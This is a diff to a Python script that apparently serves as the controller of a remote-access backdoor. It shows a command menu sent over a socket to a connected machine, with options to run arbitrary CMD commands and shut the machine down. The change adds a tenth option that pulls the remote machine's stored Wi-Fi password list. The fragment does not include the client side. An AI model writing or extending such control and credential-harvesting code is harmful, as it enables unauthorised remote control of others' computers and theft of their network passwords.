@@ -25,7 +25,9 @@ while 1:
 
           "7: Return ipconfig (TODO...) \n"
           "8: Execute custom CMD command \n"
-          "9: Shut it down -MC Hammer \n")
+          "9: Shut it down -MC Hammer \n"
+          "10:Get wifiPassword list  \n"
+          )
     print("")
     command = input(str("command >> "))
 
@@ -90,14 +92,20 @@ while 1:
 
         data = conn.recv(500000)
         data.decode()
-        print("data", data)
+        print("responce: ", data)
     elif command == "9":
         conn.send(command.encode())
         data = conn.recv(500000)
         data.decode()
-        print("data", data)
+        print("responce: ", data)
+
+    elif command == "10":
+        conn.send(command.encode())
+        data = conn.recv(500000)
+        data.decode()
+        print("wifi passwords: ", data)
 
     else:
-        print("Command not recongnised")
+        print("Invalid Command")
 
     print("")
